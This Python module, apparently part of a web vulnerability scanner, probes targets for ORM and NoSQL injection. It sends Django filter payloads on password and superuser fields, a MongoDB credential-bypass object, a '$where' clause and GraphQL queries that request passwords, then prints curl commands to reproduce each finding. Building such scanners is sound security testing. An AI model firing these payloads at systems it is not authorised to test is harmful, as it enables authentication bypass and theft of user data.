"""ORM Injection Scanner — detects ORM query manipulation vulnerabilities.

Inspired by real-world Django ORM injection exploits (p1gs crypto game writeup).
Tests for user-controlled ORM filters that leak data.
"""

from __future__ import annotations

import json
import re
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse

from .base import BaseScanner
from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter
from ..core.transport import ssl_verify


# ---------------------------------------------------------------------------
# ORM error patterns
# ---------------------------------------------------------------------------

ORM_ERRORS = [
    (r"FieldError", "Django"),
    (r"Cannot resolve keyword", "Django"),
    (r"OperationalError", "Django/SQLAlchemy"),
    (r"ProgrammingError", "Django/SQLAlchemy"),
    (r"IntegrityError", "Generic"),
    (r"DoesNotExist", "Django"),
    (r"RelatedObjectDoesNotExist", "Django"),
    (r"TypeError.*filter", "Generic ORM"),
    (r"ValueError.*query", "Generic ORM"),
    (r"Invalid keyword argument", "Django"),
    (r"Join on field.*not permitted", "Django"),
    (r"Related Field got invalid lookup", "Django"),
    (r"no such column", "SQLite"),
    (r"Unknown column", "MySQL"),
    (r"column.*does not exist", "PostgreSQL"),
    (r"SequelizeDatabaseError", "Sequelize"),
    (r"PrismaClientKnownRequestError", "Prisma"),
    (r"MongoError", "Mongoose"),
    (r"CastError", "Mongoose"),
]


class ORMInjectionScanner(BaseScanner):
    """Detects ORM injection via filter manipulation."""

    NAME = "orm_injection"

    def __init__(self, rps: float = 5.0, timeout: float = 10.0):
        super().__init__()
        self.limiter = get_limiter(rps)
        self.timeout = timeout

    def scan_url(self, url: str, auth_token: str = None, **kwargs) -> List[Finding]:
        """Scan a URL for ORM injection vulnerabilities."""
        import httpx

        findings: List[Finding] = []
        parsed = urlparse(url)
        host = parsed.netloc

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"

        client = httpx.Client(
            verify=ssl_verify(), timeout=self.timeout, follow_redirects=True, headers=headers,
        )

        try:
            # Test 1: Django-style filter injection via JSON body
            findings.extend(self._test_django_filters(client, url, host))

            # Test 2: Generic query DSL injection
            findings.extend(self._test_query_dsl(client, url, host))

            # Test 3: Query parameter filter injection
            findings.extend(self._test_query_params(client, url, host))

            # Test 4: GraphQL where clause injection
            findings.extend(self._test_graphql_where(client, url, host))

            # Test 5: Error-based detection
            findings.extend(self._test_error_based(client, url, host))

        finally:
            client.close()

        logger.info(f"ORM injection scan: {len(findings)} findings")
        return findings

    def _test_django_filters(self, client, url: str, host: str) -> List[Finding]:
        """Test Django ORM filter injection patterns."""
        findings = []

        # Django double-underscore lookups
        filter_payloads = [
            ({"password__contains": "a"}, "Django __contains filter on password"),
            ({"email__startswith": "admin"}, "Django __startswith filter on email"),
            ({"email__endswith": "@admin"}, "Django __endswith filter on email"),
            ({"id__gt": 0}, "Django __gt filter to enumerate all records"),
            ({"id__gte": 1}, "Django __gte filter"),
            ({"id__lt": 99999}, "Django __lt filter"),
            ({"id__in": [1, 2, 3, 4, 5]}, "Django __in filter"),
            ({"is_superuser": True}, "Direct superuser field access"),
            ({"is_staff": True}, "Direct staff field access"),
            ({"is_admin": True}, "Direct admin field access"),
            ({"user__is_superuser": True}, "Traversed superuser field"),
            ({"user__is_staff": True}, "Traversed staff field"),
            ({"role": "admin"}, "Role field injection"),
            ({"user_type": "admin"}, "User type field injection"),
        ]

        for payload, description in filter_payloads:
            # Try various JSON structures
            json_variants = [
                {"query": {"start_filters": payload, "filters": {}, "order": []}},
                {"filters": payload},
                {"where": payload},
                {"query": payload},
                {"filter": payload},
                payload,  # direct
            ]

            for json_body in json_variants:
                self.limiter.wait(host)
                try:
                    resp = client.post(url, json=json_body)
                    result = self._analyze_orm_response(resp, payload)
                    if result:
                        findings.append(Finding(
                            vuln_type="ORM Injection",
                            title=f"ORM injection: {description}",
                            severity="CRITICAL" if any(kw in str(payload) for kw in ["password", "superuser", "staff", "admin"]) else "HIGH",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload)[:200],
                            evidence=result,
                            description=f"{description}. Server processed ORM filter from user input.",
                            remediation="Never allow user input to directly control ORM filter parameters. Use allowlists.",
                            cvss=9.1 if "password" in str(payload) else 7.5,
                            cwe="CWE-89",
                            tool=self.NAME,
                            verified=True,
                            confidence="HIGH",
                            request=f"curl -k -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(json_body)[:200]}'",
                        ))
                        break  # Found, move to next payload
                except Exception:
                    pass

        return findings

    def _test_query_dsl(self, client, url: str, host: str) -> List[Finding]:
        """Test generic query DSL injection patterns."""
        findings = []

        dsl_payloads = [
            ({"$gt": ""}, "MongoDB $gt operator"),
            ({"$ne": ""}, "MongoDB $ne operator"),
            ({"$regex": ".*"}, "MongoDB $regex operator"),
            ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "MongoDB credential bypass"),
            ({"$where": "this.password.length > 0"}, "MongoDB $where injection"),
        ]

        for payload, description in dsl_payloads:
            for json_structure in [
                {"query": payload},
                {"filter": payload},
                {"where": payload},
                payload,
            ]:
                self.limiter.wait(host)
                try:
                    resp = client.post(url, json=json_structure)
                    result = self._analyze_orm_response(resp, payload)
                    if result:
                        findings.append(Finding(
                            vuln_type="ORM Injection",
                            title=f"NoSQL/ORM injection: {description}",
                            severity="CRITICAL",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload)[:200],
                            evidence=result,
                            description=f"{description}. Server processed NoSQL/ORM operator from user input.",
                            remediation="Sanitize query operators. Never pass user input directly to ORM queries.",
                            cvss=9.1,
                            cwe="CWE-943",
                            tool=self.NAME,
                            verified=True,
                            confidence="HIGH",
                            request=f"curl -k -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(json_structure)[:200]}'",
                        ))
                        break
                except Exception:
                    pass

        return findings

    def _test_query_params(self, client, url: str, host: str) -> List[Finding]:
        """Test filter injection via query parameters."""
        findings = []

        param_payloads = [
            ("filter[role]", "admin", "Filter parameter role injection"),
            ("filter[is_admin]", "true", "Filter parameter admin injection"),
            ("where[is_superuser]", "true", "Where clause injection"),
            ("q[user_type]", "admin", "Query user type injection"),
            ("sort", "password", "Sort by sensitive field"),
            ("fields", "password,email,secret_token", "Field selection injection"),
            ("include", "password,secret", "Related field inclusion"),
        ]

        for param, value, description in param_payloads:
            self.limiter.wait(host)
            try:
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}{param}={value}"
                resp = client.get(test_url)
                result = self._analyze_orm_response(resp, {param: value})
                if result:
                    findings.append(Finding(
                        vuln_type="ORM Injection",
                        title=f"Query param ORM injection: {description}",
                        severity="HIGH",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=f"{param}={value}",
                        evidence=result,
                        description=f"{description}. Server processes ORM filter from query parameter.",
                        remediation="Whitelist allowed query parameters. Never map directly to ORM filters.",
                        cvss=7.5,
                        cwe="CWE-89",
                        tool=self.NAME,
                        verified=True,
                        confidence="MEDIUM",
                        request=f'curl -k "{test_url}"',
                    ))
            except Exception:
                pass

        return findings

    def _test_graphql_where(self, client, url: str, host: str) -> List[Finding]:
        """Test GraphQL where clause injection."""
        findings = []

        graphql_url = url
        if "/graphql" not in url.lower():
            # Try common GraphQL endpoints
            for gql_path in ["/graphql", "/api/graphql", "/v1/graphql"]:
                parsed = urlparse(url)
                test_url = f"{parsed.scheme}://{parsed.netloc}{gql_path}"
                self.limiter.wait(host)
                try:
                    resp = client.post(test_url, json={"query": "{ __typename }"})
                    if resp.status_code == 200:
                        graphql_url = test_url
                        break
                except Exception:
                    continue

        gql_payloads = [
            ('{ users(where: {is_admin: true}) { id email password } }', "GraphQL admin user query"),
            ('{ users(where: {role: "admin"}) { id email } }', "GraphQL role filter"),
            ('{ users(filter: {is_superuser: true}) { id email } }', "GraphQL superuser filter"),
        ]

        for query, description in gql_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(graphql_url, json={"query": query})
                result = self._analyze_orm_response(resp, {"query": query})
                if result:
                    findings.append(Finding(
                        vuln_type="ORM Injection",
                        title=f"GraphQL ORM injection: {description}",
                        severity="CRITICAL",
                        url=graphql_url,
                        method="POST",
                        payload=query[:200],
                        evidence=result,
                        description=f"{description}. GraphQL query allows ORM filter manipulation.",
                        remediation="Implement field-level authorization in GraphQL resolvers. Disable introspection.",
                        cvss=9.1,
                        cwe="CWE-943",
                        tool=self.NAME,
                        verified=True,
                        confidence="HIGH",
                        request=f"curl -k -X POST '{graphql_url}' -H 'Content-Type: application/json' -d '{{\"query\": \"{query}\"}}'",
                    ))
            except Exception:
                pass

        return findings

    def _test_error_based(self, client, url: str, host: str) -> List[Finding]:
        """Detect ORM errors that leak internal structure."""
        findings = []

        # Send intentionally malformed filter to trigger errors
        error_payloads = [
            {"filter": {"__invalid_field__": "test"}},
            {"where": {"nonexistent__field": "value"}},
            {"query": {"id__invalid_lookup": "test"}},
            {"filter": {"id": {"$invalid_op": "test"}}},
        ]

        for payload in error_payloads:
            self.limiter.wait(host)
            try:
                resp = client.post(url, json=payload)
                body = resp.text[:2000]

                for pattern, orm_name in ORM_ERRORS:
                    if re.search(pattern, body, re.IGNORECASE):
                        # Extract error details
                        error_match = re.search(pattern + r"[^<\n]{0,200}", body, re.IGNORECASE)
                        error_detail = error_match.group(0)[:200] if error_match else pattern

                        findings.append(Finding(
                            vuln_type="ORM Injection",
                            title=f"ORM error disclosure ({orm_name})",
                            severity="MEDIUM",
                            url=url,
                            method="POST",
                            payload=json.dumps(payload)[:200],
                            evidence=f"ORM error: {error_detail}",
                            description=f"Server leaks {orm_name} ORM error messages, revealing internal query structure.",
                            remediation="Catch and suppress ORM errors in production. Return generic error messages.",
                            cvss=5.3,
                            cwe="CWE-209",
                            tool=self.NAME,
                            verified=True,
                            confidence="HIGH",
                            request=f"curl -k -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(payload)[:200]}'",
                        ))
                        break
            except Exception:
                pass

        return findings

    def _analyze_orm_response(self, resp, payload: Any) -> Optional[str]:
        """Analyze response to determine if ORM injection succeeded."""
        if resp.status_code not in (200, 201):
            # Check for error-based indicators
            body = resp.text[:1000]
            for pattern, orm_name in ORM_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    return f"ORM error ({orm_name}) with payload: {str(payload)[:100]}"
            return None

        body = resp.text[:2000]

        # Check for data in response
        try:
            data = resp.json()
            if isinstance(data, dict):
                # Check for data results
                for key in ["data", "results", "items", "users", "records", "objects"]:
                    if key in data and isinstance(data[key], list) and len(data[key]) > 0:
                        return f"Response contains {len(data[key])} records with payload: {str(payload)[:100]}"
                # Check for count > 0
                for key in ["count", "total", "deleted", "affected"]:
                    if key in data and isinstance(data[key], (int, float)) and data[key] > 0:
                        return f"Response {key}={data[key]} with payload: {str(payload)[:100]}"
            elif isinstance(data, list) and len(data) > 0:
                return f"Response array with {len(data)} records"
        except (json.JSONDecodeError, ValueError):
            pass

        # Check for ORM errors in successful responses
        for pattern, orm_name in ORM_ERRORS:
            if re.search(pattern, body, re.IGNORECASE):
                return f"ORM error in 200 response ({orm_name})"

        return None


__all__ = ["ORMInjectionScanner"]
